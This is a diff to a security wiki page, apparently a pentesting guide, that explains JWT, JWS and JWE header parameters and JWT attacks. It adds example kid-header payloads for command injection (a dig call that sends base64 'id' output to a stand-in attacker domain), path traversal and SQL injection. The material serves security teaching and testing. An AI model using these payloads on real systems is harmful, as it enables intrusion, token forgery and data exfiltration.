@@ -1,41 +1,36 @@
 # JSON Web Token
 
-JSON Web Token (JWT) represents a set of claims as a JSON object that is encoded in a JSON Web Signature (JWS) and/or JSON Web Encryption (JWE) structure.
-
-A JWT is represented as a sequence of URL-safe parts (JWT claims sets) separated by the `.` characters. Each part contains a base64url-encoded value.
+JSON Web Token (JWT) represents a set of claims as a JSON object that is encoded in a JSON Web Signature (JWS) and/or JSON Web Encryption (JWE) structure. A JWT is represented as a sequence of URL-safe parts (JWT claims sets) separated by the `.` characters. Each part contains a `base64url-encoded` value. The number of parts in the JWT is dependent upon the representation of the resulting JWS using the JWS compact serialization or JWE using the JWE compact serialization.
 
 {% hint style="info" %}
-Base64url algorithm is the base64 algorithm which has the following replacements:
-- `+` to `-`
-- `/` to `_`
+base64url algorithm is the base64 algorithm which has the following replacements:
 
-and there is no standard base64 padding, which usually consists of the `=` signs.
+- "+" to "-"
+- "/" to "_"
+
+and there is no standard base64 padding, which usually consists of the "=" signs
 {% endhint %}
-
-The number of parts in the JWT is dependent upon the representation of the resulting JWS using the JWS compact serialization or JWE using the JWE compact serialization.
 
 ## JWT claims
 
-The JWT claims set represents a JSON object whose members are the claims conveyed by the JWT.
-
-There are three classes of JWT claim names:
+The JWT claims set represents a JSON object whose members are the claims conveyed by the JWT. There are three classes of JWT claim names:
 - Registered Claim Names
 - Public Claim Names
 - Private Claim Names
 
 ### Registered claim names
 
-The following Claim Names are registered in the IANA "JSON Web Token Claims" registry.  None of the claims defined below are intended to be mandatory to use or implement in all cases, but rather they provide a starting point for a set of useful, interoperable claims.Applications using JWTs should define which specific claims they use and when they are required or optional.
+The following Claim Names are registered in the IANA "JSON Web Token Claims" registry. None of the claims defined below are intended to be mandatory to use or implement in all cases, but rather they provide a starting point for a set of useful, interoperable claims. Applications using JWTs should define which specific claims they use and when they are required or optional.
 
 | Claim | Definition | Type | Description |
 | ---  | ---  | --- | --- |
-| iss | Issuer | String or URI | The "iss" claim identifies the principal that issued the JWT. |
-| sub | Subject | String or URI | The "sub" claim identifies the principal that is the subject of the JWT. |
-| aud | Audience | <p>Array of strings (String or URI)</p><p>String or URI</p> | The "aud" claim identifies the recipients that the JWT is intended for. |
-| exp | Expiration Time | NumericDate | The "exp" claim identifies the expiration time on or after which the JWT must not be accepted for processing. |
-| nbf | Not Before | NumericDate | The "nbf" claim identifies the time before which the JWT must not be accepted for processing. |
-| iat | Issued At | NumericDate | The "iat" claim identifies the time at which the JWT was issued. |
-| jti | JWT ID | String | The "jti" claim provides a unique identifier for the JWT. |
+| iss | Issuer | String or URI | The "iss" claim identifies the principal that issued the JWT |
+| sub | Subject | String or URI | The "sub" claim identifies the principal that is the subject of the JWT |
+| aud | Audience | <p>Array of strings (String or URI)</p><p>String or URI</p> | The "aud" claim identifies the recipients that the JWT is intended for |
+| exp | Expiration Time | NumericDate | The "exp" claim identifies the expiration time on or after which the JWT must not be accepted for processing |
+| nbf | Not Before | NumericDate | The "nbf" claim identifies the time before which the JWT must not be accepted for processing |
+| iat | Issued At | NumericDate | The "iat" claim identifies the time at which the JWT was issued |
+| jti | JWT ID | String | The "jti" claim provides a unique identifier for the JWT |
 
 ### Public claim names
 
@@ -48,7 +43,7 @@ A producer and consumer of a JWT may agree to use claim names that are private n
 ## JOSE header
 
 {% hint style="info" %}
-The JOSE (JSON Object Signing and Encryption) header is a JSON object containing the parameters describing the cryptographic operations and parameters employed.
+The JOSE (JSON Object Signing and Encryption) header is a JSON object containing the parameters describing the cryptographic operations and parameters employed
 {% endhint %}
 
 For a JWT object, the members of the JSON object represented by the JOSE header describe the cryptographic operations applied to the JWT and optionally, additional properties of the JWT. Depending upon whether the JWT is a JWS or JWE, the corresponding rules for the JOSE header values apply.
@@ -62,7 +57,7 @@ There are two closely related serializations for JWS which both share the same c
 - The [JWS JSON Serialization](https://tools.ietf.org/html/rfc7515#section-7.2) represents JWSs as JSON objects and enables multiple signatures and/or MACs to be applied to the same content.
 
 {% hint style="info" %}
-The JWT is a JWS using the JWS compact serialization.
+The JWT is a JWS using the JWS compact serialization
 {% endhint %}
 
 A JWS represents these logical values:
@@ -81,17 +76,17 @@ JWS defines the following registered header parameter names:
 
 | Parameter | Definition | Type | Description |
 | --- | --- | --- | --- |
-| alg | Algorithm | String or URI | The "alg" header parameter identifies the cryptographic algorithm used to secure the JWS. You can find a list of possible values in the [JWA](https://tools.ietf.org/html/rfc7518) specification in [section 3.1](https://tools.ietf.org/html/rfc7518#section-3.1). |
-| jku | JWK Set URL | URI | The "jku" header parameter is a URI that refers to a resource for a set of JSON-encoded public keys (as [JWK](https://tools.ietf.org/html/rfc7517) set), one of which corresponds to the key used to digitally sign the JWS. |
-| jwk | JSON Web Key | [JWK](https://tools.ietf.org/html/rfc7517) | The "jwk" header parameter is the public key that corresponds to the key used to digitally sign the JWS. |
-| kid | Key ID | String | The "kid" header parameter is a hint indicating which key was used to secure the JWS. When used with a [JWK](https://tools.ietf.org/html/rfc7517), the kid value is used to match a JWK "kid" parameter value. |
-| x5u | X.509 URL | URI | The "x5u" header parameter is a URI that refers to a resource for the [X.509 public key certificate or certificate chain](https://tools.ietf.org/html/rfc5280) in PEM-encoded form corresponding to the key used to digitally sign the JWS. |
-| x5c | X.509 Certificate Chain | [Array of certificate value strings](https://tools.ietf.org/html/rfc7515#section-4.1.6) | The "x5c" header parameter contains the [X.509 public key certificate or certificate chain](https://tools.ietf.org/html/rfc5280) corresponding to the key used to digitally sign the JWS. |
-| x5t | X.509 certificate SHA-1 thumbprint | String | The "x5t" header parameter is a base64url-encoded SHA-1 thumbprint (digest) of the DER encoding of the X.509 certificate corresponding to the key used to digitally sign the JWS. |
-| x5t#S256 | X.509 Certificate SHA-256 Thumbprint | String | The "x5t#S256" header parameter is a base64url-encoded SHA-256 thumbprint (digest) of the DER encoding of the X.509 certificate corresponding to the key used to digitally sign the JWS. |
-| typ | Type | [IANA.MediaTypes](https://www.iana.org/assignments/media-types/media-types.xhtml) | The "typ" header parameter is used by JWS applications to declare the media type of this complete JWS. This is intended for use by the application when more than one kind of object could be present in an application data structure that can contain a JWS. To indicate that this object is a JWT, **recommended to use the "JWT" value**. |
-| cty | Content Type | [IANA.MediaTypes](https://www.iana.org/assignments/media-types/media-types.xhtml) | The "cty" header parameter is used by JWS applications to declare the media type [IANA.MediaTypes] of the secured content (the payload). In the normal case in which nested signing operations are not employed, the use of this header parameter is **not recommended**. In the case that nested signing is employed, this header parameter must be present; in this case, **the value must be "JWT"**, to indicate that a nested JWT is carried in this JWT. |
-| crit | Critical | Array of the header parameter names present in the JOSE header | The "crit" header parameter indicates that extensions and/or [JWA](https://tools.ietf.org/html/rfc7518) are being used that must be understood and processed. |
+| alg | Algorithm | String or URI | The "alg" header parameter identifies the cryptographic algorithm used to secure the JWS. You can find a list of possible values in the [JWA](https://tools.ietf.org/html/rfc7518) specification in [section 3.1](https://tools.ietf.org/html/rfc7518#section-3.1) |
+| jku | JWK Set URL | URI | The "jku" header parameter is a URI that refers to a resource for a set of JSON-encoded public keys (as [JWK](https://tools.ietf.org/html/rfc7517) set), one of which corresponds to the key used to digitally sign the JWS |
+| jwk | JSON Web Key | [JWK](https://tools.ietf.org/html/rfc7517) | The "jwk" header parameter is the public key that corresponds to the key used to digitally sign the JWS |
+| kid | Key ID | String | The "kid" header parameter is a hint indicating which key was used to secure the JWS. When used with a [JWK](https://tools.ietf.org/html/rfc7517), the kid value is used to match a JWK "kid" parameter value |
+| x5u | X.509 URL | URI | The "x5u" header parameter is a URI that refers to a resource for the [X.509 public key certificate or certificate chain](https://tools.ietf.org/html/rfc5280) in PEM-encoded form corresponding to the key used to digitally sign the JWS |
+| x5c | X.509 Certificate Chain | [Array of certificate value strings](https://tools.ietf.org/html/rfc7515#section-4.1.6) | The "x5c" header parameter contains the [X.509 public key certificate or certificate chain](https://tools.ietf.org/html/rfc5280) corresponding to the key used to digitally sign the JWS |
+| x5t | X.509 certificate SHA-1 thumbprint | String | The "x5t" header parameter is a base64url-encoded SHA-1 thumbprint (digest) of the DER encoding of the X.509 certificate corresponding to the key used to digitally sign the JWS |
+| x5t#S256 | X.509 Certificate SHA-256 Thumbprint | String | The "x5t#S256" header parameter is a base64url-encoded SHA-256 thumbprint (digest) of the DER encoding of the X.509 certificate corresponding to the key used to digitally sign the JWS |
+| typ | Type | [IANA.MediaTypes](https://www.iana.org/assignments/media-types/media-types.xhtml) | The "typ" header parameter is used by JWS applications to declare the media type of this complete JWS. This is intended for use by the application when more than one kind of object could be present in an application data structure that can contain a JWS. To indicate that this object is a JWT, **recommended to use the "JWT" value** |
+| cty | Content Type | [IANA.MediaTypes](https://www.iana.org/assignments/media-types/media-types.xhtml) | The "cty" header parameter is used by JWS applications to declare the media type [IANA.MediaTypes] of the secured content (the payload). In the normal case in which nested signing operations are not employed, the use of this header parameter is **not recommended**. In the case that nested signing is employed, this header parameter must be present; in this case, **the value must be "JWT"**, to indicate that a nested JWT is carried in this JWT |
+| crit | Critical | Array of the header parameter names present in the JOSE header | The "crit" header parameter indicates that extensions and/or [JWA](https://tools.ietf.org/html/rfc7518) are being used that must be understood and processed |
 
 ### JWS payload
 
@@ -110,7 +105,7 @@ There are two closely related serializations for JWE which both share the same c
 - The [JWE JSON Serialization](https://tools.ietf.org/html/rfc7516#section-7.2) represents JWEs as JSON objects and enables the same content to be encrypted to multiple parties.
 
 {% hint style="info" %}
-The JWT is a JWE using the JWE compact serialization.
+The JWT is a JWE using the JWE compact serialization
 {% endhint %}
 
 A JWE represents these logical values:
@@ -137,26 +132,26 @@ JWE defines the following registered header parameter names:
 
 | Parameter | Definition | Type | Description |
 | --- | --- | --- | --- |
-| alg | Algorithm | String or URI | The "alg" header parameter identifies the cryptographic algorithm used to encrypt or determine the value of the Content Encryption Key (a symmetric key for the AEAD algorithm). You can find a list of possible values in the [JWA](https://tools.ietf.org/html/rfc7518) specification in [section 4.1](https://tools.ietf.org/html/rfc7518#section-4.1). |
-| enc | Encryption Algorithm | String or URI | The "enc" header parameter identifies the content encryption algorithm used to perform authenticated encryption on the plaintext to produce the ciphertext and the authentication tag. This algorithm must be an AEAD algorithm with a specified key length. You can find a list of possible values in the [JWA](https://tools.ietf.org/html/rfc7518) specification in [section 5.1](https://tools.ietf.org/html/rfc7518#section-5.1). |
-| zip | Compression Algorithm | String | The "zip" applied to the plaintext before encryption, if any. |
-| jku | JWK Set URL | URI | The "jku" header parameter is a URI that refers to a resource for a set of JSON-encoded public keys (as [JWK](https://tools.ietf.org/html/rfc7517) set), one of which the JWE was encrypted; this can be used to determine the private key needed to decrypt the JWE. |
-| jwk | JSON Web Key | [JWK](https://tools.ietf.org/html/rfc7517) | The "jwk" header parameter is the public key that corresponds to the key used to encrypt the JWE; this can be used to determine the private key needed to decrypt the JWE. |
-| kid | Key ID | String | The "kid" header parameter is a hint indicating which key was used to encrypt the JWE. When used with a [JWK](https://tools.ietf.org/html/rfc7517), the kid value is used to match a JWK "kid" parameter value. |
-| x5u | X.509 URL | URI | The "x5u" header parameter is a URI that refers to a resource for the [X.509 public key certificate or certificate chain](https://tools.ietf.org/html/rfc5280) in PEM-encoded form corresponding to the key used to encrypt the JWE. |
-| x5c | X.509 Certificate Chain | [Array of certificate value strings](https://tools.ietf.org/html/rfc7515#section-4.1.6) | The "x5c" header parameter contains the [X.509 public key certificate or certificate chain](https://tools.ietf.org/html/rfc5280) corresponding to the key used to encrypt the JWE. |
-| x5t | X.509 certificate SHA-1 thumbprint | String | The "x5t" header parameter is a base64url-encoded SHA-1 thumbprint (digest) of the DER encoding of the X.509 certificate corresponding to the key used to encrypt the JWE. |
-| x5t#S256 | X.509 Certificate SHA-256 Thumbprint | String | The "x5t#S256" header parameter is a base64url-encoded SHA-256 thumbprint (digest) of the DER encoding of the X.509 certificate corresponding to the key used to encrypt the JWE. |
-| typ | Type | [IANA.MediaTypes](https://www.iana.org/assignments/media-types/media-types.xhtml) | The "typ" header parameter is used by JWE applications to declare the media type of this complete JWE. This is intended for use by the application when more than one kind of object could be present in an application data structure that can contain a JWE. To indicate that this object is a JWT, **recommended to use the "JWT" value**. |
-| cty | Content Type | [IANA.MediaTypes](https://www.iana.org/assignments/media-types/media-types.xhtml) | The "cty" header parameter is used by JWE applications to declare the media type [IANA.MediaTypes] of the secured content (the plaintext). In the normal case in which nested encryption operations are not employed, the use of this header parameter is **not recommended**. In the case that nested encryption is employed, this header parameter must be present; in this case, **the value must be "JWT"**, to indicate that a nested JWT is carried in this JWT. |
-| crit | Critical | Array of the header parameter names present in the JOSE header | The "crit" header parameter indicates that extensions and/or [JWA](https://tools.ietf.org/html/rfc7518) are being used that must be understood and processed. |
+| alg | Algorithm | String or URI | The "alg" header parameter identifies the cryptographic algorithm used to encrypt or determine the value of the Content Encryption Key (a symmetric key for the AEAD algorithm). You can find a list of possible values in the [JWA](https://tools.ietf.org/html/rfc7518) specification in [section 4.1](https://tools.ietf.org/html/rfc7518#section-4.1) |
+| enc | Encryption Algorithm | String or URI | The "enc" header parameter identifies the content encryption algorithm used to perform authenticated encryption on the plaintext to produce the ciphertext and the authentication tag. This algorithm must be an AEAD algorithm with a specified key length. You can find a list of possible values in the [JWA](https://tools.ietf.org/html/rfc7518) specification in [section 5.1](https://tools.ietf.org/html/rfc7518#section-5.1) |
+| zip | Compression Algorithm | String | The "zip" applied to the plaintext before encryption, if any |
+| jku | JWK Set URL | URI | The "jku" header parameter is a URI that refers to a resource for a set of JSON-encoded public keys (as [JWK](https://tools.ietf.org/html/rfc7517) set), one of which the JWE was encrypted; this can be used to determine the private key needed to decrypt the JWE |
+| jwk | JSON Web Key | [JWK](https://tools.ietf.org/html/rfc7517) | The "jwk" header parameter is the public key that corresponds to the key used to encrypt the JWE; this can be used to determine the private key needed to decrypt the JWE |
+| kid | Key ID | String | The "kid" header parameter is a hint indicating which key was used to encrypt the JWE. When used with a [JWK](https://tools.ietf.org/html/rfc7517), the kid value is used to match a JWK "kid" parameter value |
+| x5u | X.509 URL | URI | The "x5u" header parameter is a URI that refers to a resource for the [X.509 public key certificate or certificate chain](https://tools.ietf.org/html/rfc5280) in PEM-encoded form corresponding to the key used to encrypt the JWE |
+| x5c | X.509 Certificate Chain | [Array of certificate value strings](https://tools.ietf.org/html/rfc7515#section-4.1.6) | The "x5c" header parameter contains the [X.509 public key certificate or certificate chain](https://tools.ietf.org/html/rfc5280) corresponding to the key used to encrypt the JWE |
+| x5t | X.509 certificate SHA-1 thumbprint | String | The "x5t" header parameter is a base64url-encoded SHA-1 thumbprint (digest) of the DER encoding of the X.509 certificate corresponding to the key used to encrypt the JWE |
+| x5t#S256 | X.509 Certificate SHA-256 Thumbprint | String | The "x5t#S256" header parameter is a base64url-encoded SHA-256 thumbprint (digest) of the DER encoding of the X.509 certificate corresponding to the key used to encrypt the JWE |
+| typ | Type | [IANA.MediaTypes](https://www.iana.org/assignments/media-types/media-types.xhtml) | The "typ" header parameter is used by JWE applications to declare the media type of this complete JWE. This is intended for use by the application when more than one kind of object could be present in an application data structure that can contain a JWE. To indicate that this object is a JWT, **recommended to use the "JWT" value** |
+| cty | Content Type | [IANA.MediaTypes](https://www.iana.org/assignments/media-types/media-types.xhtml) | The "cty" header parameter is used by JWE applications to declare the media type [IANA.MediaTypes] of the secured content (the plaintext). In the normal case in which nested encryption operations are not employed, the use of this header parameter is **not recommended**. In the case that nested encryption is employed, this header parameter must be present; in this case, **the value must be "JWT"**, to indicate that a nested JWT is carried in this JWT |
+| crit | Critical | Array of the header parameter names present in the JOSE header | The "crit" header parameter indicates that extensions and/or [JWA](https://tools.ietf.org/html/rfc7518) are being used that must be understood and processed |
 
 ### JWE Encrypted Key
 
 {% hint style="info" %}
-**Authenticated Encryption with Associated Data (AEAD)** is an algorithm is one that encrypts the plaintext, allows additional authenticated data to be specified, and provides an integrated content integrity check over the ciphertext and additional authenticated data. AEAD algorithms accept two inputs, the plaintext and the additional authenticated data value, and produce two outputs, the ciphertext and the authentication tag value. AES Galois/Counter Mode (GCM) is one such algorithm.
+**Authenticated Encryption with Associated Data (AEAD)** is an algorithm is one that encrypts the plaintext, allows additional authenticated data to be specified, and provides an integrated content integrity check over the ciphertext and additional authenticated data. AEAD algorithms accept two inputs, the plaintext and the additional authenticated data value, and produce two outputs, the ciphertext and the authentication tag value. AES Galois/Counter Mode (GCM) is one such algorithm
 
-**Content encryption key** is a symmetric key for the AEAD algorithm used to encrypt the plaintext to produce the ciphertext and the authentication tag.
+**Content encryption key** is a symmetric key for the AEAD algorithm used to encrypt the plaintext to produce the ciphertext and the authentication tag
 {% endhint %}
 
 Encrypted content encryption key value. Note that for some algorithms, the JWE encrypted key value is specified as being the empty octet sequence.
@@ -182,7 +177,7 @@ Ciphertext is a value resulting from authenticated encryption of the plaintext w
 ### JWE Authentication Tag
 
 {% hint style="info" %}
-**Authentication Tag** is an output of an AEAD operation that ensures the integrity of the ciphertext and the additional authenticated data. Note that some algorithms may not use an authentication tag, in which case this value is the empty octet sequence.
+**Authentication Tag** is an output of an AEAD operation that ensures the integrity of the ciphertext and the additional authenticated data. Note that some algorithms may not use an authentication tag, in which case this value is the empty octet sequence
 {% endhint %}
 
 Authentication tag is a value resulting from authenticated encryption of the plaintext with additional authenticated data.
@@ -309,7 +304,43 @@ The "jku" ("x5u") header parameter is the URI that the server uses to retrieve t
 
 ## Injections via the kid header parameter
 
-The "kid" header parameter is used by the relying application to perform key lookup. Try to get SQL, LDAP or OS injection vulnerabilities.
+The `kid` header parameter is used by the relying application to perform key lookup.
+
+### Command injection
+
+`kid` parameter can be passed to the system-like function, that will lead to the command injection:
+
+```json
+{
+    "alg": "HS256",
+    "typ": "JWT",
+    "kid": "kid;dig $(id | base64 -w0).attacker-website.com",
+}
+```
+
+### Path traversal
+
+The `kid` parameter specifies the path to the key in a filesystem, which is used to verify the token. If an attacker enters the path to a file with predictable content in the `kid` parameter, they will be able to generate a forged token since the secret key is already known. One such file is the `/proc/sys/kernel/randomize_va_space`, which is used in Linux systems and has predictable values like `0,1,2`. An attacker can create a malicious token using secret values `0,1,2` and send it to the server.
+
+```json
+{
+    "alg": "HS256",
+    "typ": "JWT",
+    "kid": "../../../../../../../dev/null",
+}
+```
+
+### SQL injection
+
+An application can store its keys in a database. If such a key is referenced in the `kid` parameter, it might be vulnerable to SQL injection.
+
+```json
+{
+    "alg": "HS256",
+    "typ": "JWT",
+    "kid": "key' UNION SELECT 'hop",
+}
+```
 
 ## Substitution attacks
 
@@ -340,5 +371,6 @@ References:
 - [RFC7519: JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)
 - [RFC7515: JSON Web Signature (JWS)](https://tools.ietf.org/html/rfc7515)
 - [RFC7516: JSON Web Encryption (JWE)](https://tools.ietf.org/html/rfc7516)
-- [Securitum: JWT (JSON Web Token) (in)security](https://research.securitum.com/jwt-json-web-token-security/)
 - [JSON Web Token Best Current Practices](https://tools.ietf.org/id/draft-ietf-oauth-jwt-bcp-02.html)
+- [Securitum: JWT (JSON Web Token) (in)security](https://research.securitum.com/jwt-json-web-token-security/)
+- [Redhunt Labs: A Practical Guide to Attacking JWT (JSON Web Tokens)](https://research.securitum.com/jwt-json-web-token-security/)
